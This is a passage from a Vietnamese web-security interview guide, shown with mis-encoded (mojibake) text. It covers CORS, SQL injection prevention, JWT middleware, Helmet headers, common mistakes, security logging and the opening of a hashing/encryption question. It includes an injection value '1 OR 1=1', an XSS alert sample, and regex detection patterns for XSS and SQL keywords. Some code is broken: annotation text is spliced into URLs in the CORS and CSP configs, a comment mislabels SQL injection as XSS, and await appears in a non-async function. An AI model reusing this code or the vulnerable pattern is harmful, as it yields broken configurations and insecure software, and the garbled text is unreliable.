    // Validation pass ‚Üí data ƒë√£ clean v√† ƒë√∫ng type
    console.log('‚úÖ Data h·ª£p l·ªá:', data);

    // X·ª≠ l√Ω transfer v·ªõi data ƒë√£ validate
    const result = await processTransfer(data);

    res.json({ success: true, result });

  } catch (error) {
    // Validation fail ‚Üí tr·∫£ l·ªói chi ti·∫øt
    if (error instanceof z.ZodError) {
      console.log('‚ùå Validation errors:', error.errors);
      return res.status(400).json({
        error: 'D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá',
        details: error.errors
      });
    }

    res.status(500).json({ error: 'L·ªói server' });
  }
});

// üõ°Ô∏è C. CORS Configuration (Ki·ªÉm So√°t Ngu·ªìn G·ªëc Requests)
// CORS: Quy ƒë·ªãnh domain n√†o ƒë∆∞·ª£c ph√©p call API
import cors from 'cors';

// CORS config nghi√™m ng·∫∑t
const corsOptions = {
  origin: [
    'https: // Ch√∫ gi·∫£i: yourdomain.com',      // Production domain
    'https: // Ch√∫ gi·∫£i: staging.yourdomain.com', // Staging
  ],
  // KH√îNG d√πng origin: '*' trong production (cho ph√©p m·ªçi domain)

  methods: ['GET', 'POST', 'PUT', 'DELETE'], // HTTP methods cho ph√©p

  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-CSRF-Token'
  ], // Headers cho ph√©p

  credentials: true, // Cho ph√©p g·ª≠i cookies

  maxAge: 86400 // Ch√∫ gi·∫£i: Cache preflight request 24h
};

app.use(cors(corsOptions));

// üõ°Ô∏è D. SQL Injection Prevention (NgƒÉn Ch·∫∑n SQL Injection)
// LU√îN d√πng parameterized queries, KH√îNG n·ªëi string SQL

// ‚ùå KH√îNG AN TO√ÄN: String concatenation
const userId = req.params.id;
const query = `SELECT * FROM users WHERE id = ${userId}`; // Ch√∫ gi·∫£i: XSS: userId = "1 OR 1=1"
db.query(query); // ‚ùå Tr·∫£ v·ªÅ t·∫•t c·∫£ users!

// ‚úÖ AN TO√ÄN: Parameterized query
const userId = req.params.id;
const query = 'SELECT * FROM users WHERE id = ?'; // Ch√∫ gi·∫£i: Placeholder
db.query(query, [userId]); // ‚úÖ Library t·ª± ƒë·ªông escape

// üõ°Ô∏è E. API Authentication (X√°c Th·ª±c API)
// Middleware ki·ªÉm tra token
const authenticateToken = (req, res, next) => {
 // Ch√∫ gi·∫£i: L·∫•y token t·ª´ header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Ch√∫ gi·∫£i: "Bearer TOKEN"

  if (!token) {
    return res.status(401).json({ error: 'Thi·∫øu access token' });
  }

  try {
 // Ch√∫ gi·∫£i: Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    req.user = decoded; // G·∫Øn user info v√†o request
    next(); // Token h·ª£p l·ªá ‚Üí ti·∫øp t·ª•c
  } catch (error) {
    return res.status(403).json({ error: 'Token kh√¥ng h·ª£p l·ªá ho·∫∑c h·∫øt h·∫°n' });
  }
};

// √Åp d·ª•ng middleware cho protected routes
app.get('/api/profile', authenticateToken, (req, res) => {
  // req.user ƒë√£ c√≥ th√¥ng tin t·ª´ token
  res.json({ user: req.user });
});

app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
 // Ch√∫ gi·∫£i: Multiple layers: Authentication + Rate limiting + Validation
 // Ch√∫ gi·∫£i: ...
});

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 7Ô∏è‚É£ SECURITY HEADERS (HEADERS B·∫¢O M·∫¨T)
 // Ch√∫ gi·∫£i: ============================================

// Security Headers: HTTP response headers tƒÉng c∆∞·ªùng b·∫£o m·∫≠t
// Helmet.js: Th∆∞ vi·ªán t·ª± ƒë·ªông set c√°c security headers

import helmet from 'helmet';
import express from 'express';

const app = express();

// √Åp d·ª•ng Helmet v·ªõi config chi ti·∫øt
app.use(helmet({

  // 1. Content Security Policy (CSP) - Ki·ªÉm so√°t ngu·ªìn t√†i nguy√™n
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],  // M·∫∑c ƒë·ªãnh ch·ªâ load t·ª´ c√πng origin

      scriptSrc: [
        "'self'",  // Scripts t·ª´ c√πng domain
        "'unsafe-inline'",  // Cho ph√©p inline scripts (c·∫ßn cho React)
        "https: // Ch√∫ gi·∫£i: trusted-cdn.com"  // CDN tin c·∫≠y
      ],

      styleSrc: [
        "'self'",
        "'unsafe-inline'" // Ch√∫ gi·∫£i: Inline styles (c·∫ßn cho styled-components)
      ],

      imgSrc: [
        "'self'", // Ch√∫ gi·∫£i: Images t·ª´ domain
        "data:", // Ch√∫ gi·∫£i: Data URLs (base64 images)
        "https:" // Ch√∫ gi·∫£i: HTTPS images
      ],

      connectSrc: [
        "'self'", // Ch√∫ gi·∫£i: Fetch/WebSocket t·ª´ domain
        "https: // Ch√∫ gi·∫£i: api.example.com"  // API endpoints
      ],

      fontSrc: ["'self'", "https: // Ch√∫ gi·∫£i: fonts.gstatic.com"],

      objectSrc: ["'none'"],  // Kh√¥ng cho ph√©p <object>, <embed>

      mediaSrc: ["'self'"], // Ch√∫ gi·∫£i: Video/Audio

      frameSrc: ["'none'"]  // Kh√¥ng cho ph√©p iframe
    }
  },

 // Ch√∫ gi·∫£i: 2. X-Frame-Options - Ch·ªëng Clickjacking
  // Clickjacking: Hacker nh√∫ng site v√†o iframe, l·ª´a user click v√†o button ·∫©n
  xFrameOptions: {
    action: 'deny'  // Kh√¥ng cho ph√©p site ƒë∆∞·ª£c nh√∫ng trong iframe
  },
  // Ho·∫∑c: action: 'sameorigin' (ch·ªâ iframe t·ª´ c√πng domain)

 // Ch√∫ gi·∫£i: 3. X-Content-Type-Options - Ch·ªëng MIME type sniffing
  // noSniff: true ‚Üí Browser kh√¥ng ƒëo√°n MIME type, ph·∫£i d√πng ƒë√∫ng Content-Type
  noSniff: true,
  // VD: File .txt c√≥ MIME text/plain ‚Üí browser KH√îNG execute nh∆∞ JavaScript

  // 4. Referrer-Policy - Ki·ªÉm so√°t th√¥ng tin Referrer
  referrerPolicy: {
    policy: 'no-referrer'  // Kh√¥ng g·ª≠i referrer header (gi·∫•u ngu·ªìn g·ªëc request)
  },
  // C√°c option kh√°c: 'no-referrer-when-downgrade', 'same-origin', 'strict-origin'

 // Ch√∫ gi·∫£i: 5. X-XSS-Protection (Legacy, CSP t·ªët h∆°n)
  xssFilter: true, // Ch√∫ gi·∫£i: Enable XSS filter built-in c·ªßa browser

 // Ch√∫ gi·∫£i: 6. Strict-Transport-Security (HSTS)
  hsts: {
    maxAge: 31536000,  // 1 nƒÉm (gi√¢y)
    includeSubDomains: true,  // √Åp d·ª•ng cho subdomain
    preload: true  // ƒê∆∞a v√†o HSTS preload list
  }

}));

// Ho·∫∑c set headers th·ªß c√¥ng
app.use((req, res, next) => {
 // Ch√∫ gi·∫£i: CSP Header
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );

 // Ch√∫ gi·∫£i: X-Frame-Options
  res.setHeader('X-Frame-Options', 'DENY');

 // Ch√∫ gi·∫£i: X-Content-Type-Options
  res.setHeader('X-Content-Type-Options', 'nosniff');

 // Ch√∫ gi·∫£i: Referrer-Policy
  res.setHeader('Referrer-Policy', 'no-referrer');

  // Permissions-Policy (t·∫Øt features kh√¥ng d√πng)
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'  // T·∫Øt location, mic, camera
  );

  next();
});

// üìã B·∫¢NG T√ìM T·∫ÆT SECURITY HEADERS
/*
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Header                     ‚îÇ M·ª•c ƒê√≠ch                                 ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Content-Security-Policy    ‚îÇ Ki·ªÉm so√°t ngu·ªìn scripts, styles, images  ‚îÇ
‚îÇ X-Frame-Options            ‚îÇ Ch·ªëng Clickjacking (iframe embed)        ‚îÇ
‚îÇ X-Content-Type-Options     ‚îÇ Ch·ªëng MIME type sniffing                 ‚îÇ
‚îÇ Referrer-Policy            ‚îÇ Ki·ªÉm so√°t th√¥ng tin referrer             ‚îÇ
‚îÇ Strict-Transport-Security  ‚îÇ B·∫Øt bu·ªôc HTTPS                           ‚îÇ
‚îÇ X-XSS-Protection           ‚îÇ Enable browser XSS filter (legacy)       ‚îÇ
‚îÇ Permissions-Policy         ‚îÇ T·∫Øt browser features kh√¥ng d√πng          ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
*/

// ‚úÖ Ki·ªÉm tra headers:
 // Ch√∫ gi·∫£i: 1. M·ªü DevTools ‚Üí Network tab
// 2. Ch·ªçn request b·∫•t k·ª≥
 // Ch√∫ gi·∫£i: 3. Xem Response Headers
// 4. Ho·∫∑c d√πng https://securityheaders.com ƒë·ªÉ scan

// V√ç D·ª§ RESPONSE HEADERS:
/*
HTTP/2 200
content-security-policy: default-src 'self'
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains; preload
*/
```

**üéØ Security Checklist:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Security Checklist cho Trading Platform

const securityChecklist = {
  transport: {
    https: true,
    hsts: true,
    tlsVersion: 'TLS 1.3',
    certificateExpiry: 'Valid',
  },

  xssPrevention: {
    inputSanitization: true,
    outputEncoding: true,
    cspHeaders: true,
    dompurify: true,
  },

  csrfProtection: {
    csrfTokens: true,
    sameSiteCookies: true,
    customHeaders: true,
  },

  authentication: {
    jwtTokens: true,
    refreshTokens: true,
    tokenExpiry: '15m',
    passwordHashing: 'bcrypt',
  },

  storage: {
    noSensitiveLocalStorage: true,
    httpOnlyCookies: true,
    encryptedData: true,
  },

  apiSecurity: {
    rateLimiting: true,
    inputValidation: true,
    cors: true,
    apiKeys: true,
  },

  headers: {
    contentSecurityPolicy: true,
    xFrameOptions: true,
    xContentTypeOptions: true,
    referrerPolicy: true,
  },
};
```

**Best Practices:**

1. **Defense in Depth**: Multiple layers of security
2. **Principle of Least Privilege**: Minimal permissions
3. **Input Validation**: Server-side validation always
4. **Secure Storage**: HttpOnly cookies, no localStorage for sensitive data
5. **Regular Updates**: Dependencies, libraries, frameworks
6. **Security Audits**: Penetration testing, code reviews
7. **Monitoring**: Log security events, detect anomalies

**Common Mistakes (L·ªói B·∫£o M·∫≠t Th∆∞·ªùng G·∫∑p):**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 1: L∆∞u tokens trong localStorage
// V·∫•n ƒë·ªÅ: XSS c√≥ th·ªÉ ƒë·ªçc localStorage ‚Üí steal token
localStorage.setItem('token', token); // ‚ùå Nguy hi·ªÉm!
localStorage.setItem('refreshToken', refreshToken); // ‚ùå R·∫•t nguy hi·ªÉm!

// ‚úÖ C√ÅCH S·ª¨A: D√πng HttpOnly cookies
 // Ch√∫ gi·∫£i: Server:
res.cookie('refreshToken', token, {
  httpOnly: true, // JavaScript kh√¥ng ƒë·ªçc ƒë∆∞·ª£c
  secure: true, // Ch√∫ gi·∫£i: Ch·ªâ g·ª≠i qua HTTPS
  sameSite: 'strict', // Ch√∫ gi·∫£i: Ch·ªëng CSRF
});
// Client: Kh√¥ng c·∫ßn l√†m g√¨, browser t·ª± ƒë·ªông g·ª≠i cookie

// ‚ùå L·ªñI 2: Kh√¥ng sanitize user input
// V·∫•n ƒë·ªÅ: User nh·∫≠p <script>alert('XSS')</script> ‚Üí script ch·∫°y
function Comment({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ‚ùå Nguy hi·ªÉm!
}

// ‚úÖ C√ÅCH S·ª¨A: D√πng DOMPurify sanitize
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // Ch·ªâ cho ph√©p tags an to√†n
    ALLOWED_ATTR: [], // Kh√¥ng cho ph√©p attributes
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />; // ‚úÖ An to√†n
}

// ‚ùå L·ªñI 3: Kh√¥ng c√≥ CSRF protection
// V·∫•n ƒë·ªÅ: Hacker l·ª´a user click link ‚Üí browser g·ª≠i request k√®m cookies
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000 }),
}); // ‚ùå Thi·∫øu CSRF token

// ‚úÖ C√ÅCH S·ª¨A: G·ª≠i CSRF token
 // Ch√∫ gi·∫£i: 1. L·∫•y token t·ª´ server
const csrfToken = await fetch('/api/csrf-token').then((r) => r.json());

// 2. G·ª≠i token c√πng request
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken.token, // Ch√∫ gi·∫£i: ‚úÖ G·ª≠i token
  },
  body: JSON.stringify({ amount: 1000, csrfToken: csrfToken.token }),
});

// ‚ùå L·ªñI 4: Password y·∫øu
// V·∫•n ƒë·ªÅ: Password ng·∫Øn ‚Üí d·ªÖ brute-force
const isValid = password.length >= 6; // ‚ùå Qu√° y·∫øu (123456, password)

// ‚úÖ C√ÅCH S·ª¨A: Password policy m·∫°nh
// Regex: √çt nh·∫•t 12 k√Ω t·ª±, c√≥ ch·ªØ th∆∞·ªùng, ch·ªØ hoa, s·ªë, k√Ω t·ª± ƒë·∫∑c bi·ªát
const passwordRegex =
  /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;

function validatePassword(password: string): boolean {
  if (!passwordRegex.test(password)) {
    throw new Error(
      'Password ph·∫£i c√≥ √≠t nh·∫•t 12 k√Ω t·ª±, bao g·ªìm ch·ªØ hoa, ch·ªØ th∆∞·ªùng, s·ªë v√† k√Ω t·ª± ƒë·∫∑c bi·ªát'
    );
  }
  return true;
}

// VD: "Pass123!" ‚Üí ‚ùå Fail (ch·ªâ 8 k√Ω t·ª±)
 // Ch√∫ gi·∫£i: "MySecurePass123!" ‚Üí ‚úÖ Pass

// ‚ùå L·ªñI 5: Kh√¥ng c√≥ rate limiting
// V·∫•n ƒë·ªÅ: Hacker th·ª≠ 1 tri·ªáu passwords trong v√†i ph√∫t
app.post('/api/login', async (req, res) => {
  // ‚ùå Kh√¥ng gi·ªõi h·∫°n ‚Üí brute-force d·ªÖ d√†ng
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ‚úÖ C√ÅCH S·ª¨A: Th√™m rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 ph√∫t
  max: 5, // Ch√∫ gi·∫£i: Ch·ªâ cho 5 l·∫ßn th·ª≠
  message: 'Qu√° nhi·ªÅu l·∫ßn th·ª≠ login, vui l√≤ng th·ª≠ l·∫°i sau 15 ph√∫t',
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // ‚úÖ Gi·ªõi h·∫°n 5 l·∫ßn/15 ph√∫t ‚Üí brute-force kh√≥ h∆°n
  const user = await authenticateUser(req.body);
  res.json(user);
});

 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 6: Hardcode secrets trong code
// V·∫•n ƒë·ªÅ: Secret b·ªã l·ªô khi push l√™n GitHub
const JWT_SECRET = 'my-secret-key-123'; // ‚ùå Nguy hi·ªÉm!
const API_KEY = 'sk_live_abc123xyz'; // Ch√∫ gi·∫£i: ‚ùå L·ªô API key

// ‚úÖ C√ÅCH S·ª¨A: D√πng environment variables
 // Ch√∫ gi·∫£i: File: .env
 // Ch√∫ gi·∫£i: JWT_SECRET=randomly-generated-secure-key-xyz789
 // Ch√∫ gi·∫£i: API_KEY=sk_live_abc123xyz

 // Ch√∫ gi·∫£i: Code:
const JWT_SECRET = process.env.JWT_SECRET; // ‚úÖ ƒê·ªçc t·ª´ env
const API_KEY = process.env.API_KEY;

// .gitignore ph·∫£i c√≥ .env ƒë·ªÉ kh√¥ng commit secrets

 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 7: CORS wildcard trong production
// V·∫•n ƒë·ªÅ: Cho ph√©p m·ªçi domain call API
app.use(cors({ origin: '*' })); // ‚ùå M·ªçi domain ƒë·ªÅu g·ªçi ƒë∆∞·ª£c

// ‚úÖ C√ÅCH S·ª¨A: Whitelist domains c·ª• th·ªÉ
app.use(
  cors({
    origin: ['https://yourdomain.com', 'https://app.yourdomain.com'], // ‚úÖ Ch·ªâ cho ph√©p domains n√†y
    credentials: true,
  })
);
```

**Monitoring & Logging (Gi√°m S√°t & Ghi Log B·∫£o M·∫≠t):**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Security Event Logging System
// M·ª•c ƒë√≠ch: Ph√°t hi·ªán v√† theo d√µi c√°c ho·∫°t ƒë·ªông b·∫•t th∆∞·ªùng

import winston from 'winston'; // Th∆∞ vi·ªán logging m·∫°nh m·∫Ω

// C·∫•u h√¨nh logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    // Ghi v√†o file
    new winston.transports.File({ filename: 'security.log' }),
    // G·ª≠i ƒë·∫øn service gi√°m s√°t (VD: Elasticsearch, Datadog)
    new winston.transports.Http({ host: 'logs.example.com' }),
  ],
});

 // Ch√∫ gi·∫£i: 1. Log Failed Login Attempts (L·∫ßn Th·ª≠ Login Th·∫•t B·∫°i)
// Ph√°t hi·ªán brute-force attack
function logFailedLogin(email: string, ip: string, timestamp: Date) {
  securityLogger.warn({
    event: 'FAILED_LOGIN',
    email,
    ip,
    timestamp,
    message: `Th·ª≠ login th·∫•t b·∫°i: ${email} t·ª´ IP ${ip}`,
  });

  // Ki·ªÉm tra s·ªë l·∫ßn th·ª≠ th·∫•t b·∫°i
  const failedAttempts = await getFailedAttempts(ip, email);

  if (failedAttempts >= 5) {
    securityLogger.error({
      event: 'BRUTE_FORCE_DETECTED',
      email,
      ip,
      attempts: failedAttempts,
      message: `‚ö†Ô∏è Ph√°t hi·ªán brute-force: ${failedAttempts} l·∫ßn th·ª≠ t·ª´ ${ip}`,
    });

 // Ch√∫ gi·∫£i: Block IP t·∫°m th·ªùi
    await blockIP(ip, 3600); // Ch√∫ gi·∫£i: Block 1 gi·ªù

 // Ch√∫ gi·∫£i: G·ª≠i alert cho security team
    await sendAlert('security@example.com', `Brute-force detected: ${ip}`);
  }
}

// 2. Log Suspicious Activity (Ho·∫°t ƒê·ªông ƒê√°ng Ng·ªù)
// VD: User truy c·∫≠p nhi·ªÅu accounts, transfer s·ªë ti·ªÅn b·∫•t th∆∞·ªùng
function logSuspiciousActivity(userId: string, action: string, details: any) {
  securityLogger.warn({
    event: 'SUSPICIOUS_ACTIVITY',
    userId,
    action,
    details,
    timestamp: new Date(),
    message: `Ho·∫°t ƒë·ªông ƒë√°ng ng·ªù: User ${userId} - ${action}`,
  });

  // VD: Transfer s·ªë ti·ªÅn l·ªõn b·∫•t th∆∞·ªùng
  if (action === 'LARGE_TRANSFER' && details.amount > 100000) {
    // G·ª≠i OTP x√°c nh·∫≠n
    await sendOTP(userId);

 // Ch√∫ gi·∫£i: Alert security team
    await sendAlert(
      'security@example.com',
      `Large transfer detected: User ${userId} - $${details.amount}`
    );
  }
}

// 3. Log XSS Attempts (Th·ª≠ T·∫•n C√¥ng XSS)
// Ph√°t hi·ªán khi user nh·∫≠p script tags ho·∫∑c malicious code
function logXSSAttempt(input: string, ip: string, userId?: string) {
  // Detect script tags ho·∫∑c javascript: protocol
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;

  if (xssPattern.test(input)) {
    securityLogger.error({
      event: 'XSS_ATTEMPT',
      ip,
      userId: userId || 'anonymous',
      input: input.substring(0, 200), // Ch·ªâ log 200 k√Ω t·ª± ƒë·∫ßu
      timestamp: new Date(),
      message: `‚ö†Ô∏è Ph√°t hi·ªán XSS attempt t·ª´ IP ${ip}`,
    });

 // Ch√∫ gi·∫£i: Block IP ngay l·∫≠p t·ª©c
    await blockIP(ip, 86400); // Ch√∫ gi·∫£i: Block 24 gi·ªù

 // Ch√∫ gi·∫£i: Alert admin
    await sendAlert(
      'admin@example.com',
      `XSS attempt from ${ip}: ${input.substring(0, 100)}...`
    );
  }
}

 // Ch√∫ gi·∫£i: 4. Log SQL Injection Attempts
function logSQLInjectionAttempt(query: string, ip: string) {
  const sqlPattern = /(\bOR\b|\bAND\b).*=.*|UNION|DROP|DELETE|INSERT/i;

  if (sqlPattern.test(query)) {
    securityLogger.error({
      event: 'SQL_INJECTION_ATTEMPT',
      ip,
      query: query.substring(0, 200),
      timestamp: new Date(),
      message: `‚ö†Ô∏è SQL injection attempt t·ª´ ${ip}`,
    });

    await blockIP(ip, 86400);
  }
}

 // Ch√∫ gi·∫£i: 5. Log Authentication Events
function logAuthEvent(
  event: string,
  userId: string,
  ip: string,
  success: boolean
) {
  securityLogger.info({
    event: 'AUTH_EVENT',
    type: event, // Ch√∫ gi·∫£i: 'LOGIN', 'LOGOUT', 'TOKEN_REFRESH', 'PASSWORD_CHANGE'
    userId,
    ip,
    success,
    timestamp: new Date(),
    message: `${event}: User ${userId} t·ª´ ${ip} - ${
      success ? 'Th√†nh c√¥ng' : 'Th·∫•t b·∫°i'
    }`,
  });
}

 // Ch√∫ gi·∫£i: 6. Real-time Monitoring Dashboard
// Hi·ªÉn th·ªã logs real-time cho security team
import { Server } from 'socket.io';

const io = new Server(server);

// G·ª≠i security events real-time ƒë·∫øn dashboard
securityLogger.on('data', (logEntry) => {
  if (logEntry.level === 'error' || logEntry.level === 'warn') {
    // Emit ƒë·∫øn security dashboard
    io.to('security-room').emit('security-alert', logEntry);
  }
});

 // Ch√∫ gi·∫£i: Dashboard component (React)
function SecurityDashboard() {
  const [alerts, setAlerts] = useState<any[]>([]);

  useEffect(() => {
    const socket = io('wss: // Ch√∫ gi·∫£i: your-server.com');
    socket.emit('join', 'security-room');

    socket.on('security-alert', (alert) => {
      setAlerts((prev) => [alert, ...prev].slice(0, 100)); // Ch√∫ gi·∫£i: Keep 100 alerts

 // Ch√∫ gi·∫£i: Play sound for critical alerts
      if (
        alert.event === 'BRUTE_FORCE_DETECTED' ||
        alert.event === 'XSS_ATTEMPT'
      ) {
        playAlertSound();
      }
    });

    return () => socket.disconnect();
  }, []);

  return (
    <div className="security-dashboard">
      <h2>üõ°Ô∏è Security Monitoring Dashboard</h2>
      {alerts.map((alert, i) => (
        <div key={i} className={`alert alert-${alert.level}`}>
          <span className="time">{alert.timestamp}</span>
          <span className="event">{alert.event}</span>
          <span className="message">{alert.message}</span>
        </div>
      ))}
    </div>
  );
}

// üìä METRICS TRACKING (Theo d√µi ch·ªâ s·ªë)
interface SecurityMetrics {
  totalRequests: number;
  failedLogins: number;
  xssAttempts: number;
  sqlInjectionAttempts: number;
  blockedIPs: number;
}

 // Ch√∫ gi·∫£i: Track metrics theo th·ªùi gian
const metrics: SecurityMetrics = {
  totalRequests: 0,
  failedLogins: 0,
  xssAttempts: 0,
  sqlInjectionAttempts: 0,
  blockedIPs: 0,
};

// G·ª≠i metrics ƒë·∫øn monitoring service (VD: Prometheus, Grafana)
setInterval(() => {
  sendMetrics('security.metrics', metrics);
  console.log('üìä Security Metrics:', metrics);
}, 60000); // M·ªói ph√∫t
```

---
---
## 40. üîë Q40: Hashing, Encryption & Digital Signatures - Ph√¢n Bi·ªát & ·ª®ng D·ª•ng Th·ª±c T·∫ø  

**P1: T√™n c√¢u h·ªèi:** üîë Q40: Hashing, Encryption & Digital Signatures - Ph√¢n Bi·ªát & ·ª®ng D·ª•ng Th·ª±c T·∫ø  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Hashing = one-way (password storage), Encryption = two-way (data confidentiality), Digital Signature = verify authenticity. M·ªói lo·∫°i ph·ª•c v·ª• m·ª•c ƒë√≠ch b·∫£o m·∫≠t kh√°c nhau."**

**üîë 3 K·ªπ Thu·∫≠t Ch√≠nh:**

**1. Hashing (One-Way):**
- **Kh√¥ng ƒë·∫£o ng∆∞·ª£c** - input ‚Üí hash, KH√îNG th·ªÉ hash ‚Üí input
- Algorithms: **bcrypt** (passwords), SHA-256 (checksums), MD5 (deprecated)
- Use case: **Password storage**, file integrity verification, blockchain
- Salt ƒë·ªÉ ch·ªëng rainbow table: `bcrypt(password + salt)`

**2. Encryption (Two-Way):**
- **M√£ h√≥a ‚Üî Gi·∫£i m√£** v·ªõi key
- **Symmetric** (AES): c√πng key encrypt/decrypt - nhanh, HTTPS
- **Asymmetric** (RSA): public key encrypt, private key decrypt - ch·∫≠m h∆°n, key exchange
- Use case: **Data confidentiality** (HTTPS, database encryption, file encryption)

**3. Digital Signature:**
- **Sign v·ªõi private key**, **verify v·ªõi public key**
- Algorithms: RSA, ECDSA, EdDSA
- Use case: **JWT tokens**, API authentication, verify message authenticity
- Flow: `hash(data) ‚Üí encrypt v·ªõi private key ‚Üí signature`

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Hash passwords v·ªõi SHA-256 thay bcrypt ‚Üí d·ªÖ brute-force (SHA-256 qu√° nhanh)
- L∆∞u encryption key c√πng database ‚Üí compromise key = compromise data
- D√πng MD5/SHA-1 cho security ‚Üí deprecated (collision attacks)
- JWT verify v·ªõi `HS256` m√† expose secret ‚Üí attacker t·∫°o fake tokens

**üí° Ki·∫øn Th·ª©c Senior:**
- **bcrypt work factor**: TƒÉng rounds (10‚Üí12) khi CPU m·∫°nh h∆°n ƒë·ªÉ ch·ªëng brute-force
- **AES-GCM** > AES-CBC: authenticated encryption (ch·ªëng tamper)
- **RSA key size**: 2048-bit minimum, 4096-bit recommended (banking)
- **JWT algorithms**: HS256 (symmetric, shared secret) vs RS256 (asymmetric, safer)
- **Key rotation**: Thay ƒë·ªïi encryption keys ƒë·ªãnh k·ª≥, re-encrypt data

**‚ùì C√¢u H·ªèi:**
Ph√¢n bi·ªát Hashing, Encryption v√† Digital Signature. Khi n√†o d√πng t·ª´ng lo·∫°i? Gi·∫£i th√≠ch c∆° ch·∫ø ho·∫°t ƒë·ªông v√† v√≠ d·ª• th·ª±c t·∫ø v·ªõi bcrypt, AES, RSA, JWT signing.

#### **üìä So S√°nh T·ªïng Quan: Hash vs Encryption vs Digital Signature**

| Ti√™u Ch√≠           | **Hashing**                   | **Encryption**                      | **Digital Signature**                   |
| ------------------ | ----------------------------- | ----------------------------------- | --------------------------------------- |
| **C∆° Ch·∫ø**         | One-way (kh√¥ng ƒë·∫£o ng∆∞·ª£c)     | Two-way (m√£ h√≥a ‚Üî gi·∫£i m√£)          | Sign & Verify (k√Ω & x√°c th·ª±c)           |
| **M·ª•c ƒê√≠ch**       | Verify integrity, checksum    | Protect confidentiality             | Verify authenticity & integrity         |
| **Reversible?**    | ‚ùå KH√îNG (cannot decrypt)     | ‚úÖ C√ì (with key)                    | ‚úÖ C√ì (verify only, not decrypt)        |
| **Input ‚Üí Output** | B·∫•t k·ª≥ ƒë·ªô d√†i ‚Üí Fixed length  | B·∫•t k·ª≥ ƒë·ªô d√†i ‚Üí Variable ciphertext | Data ‚Üí Signature                        |
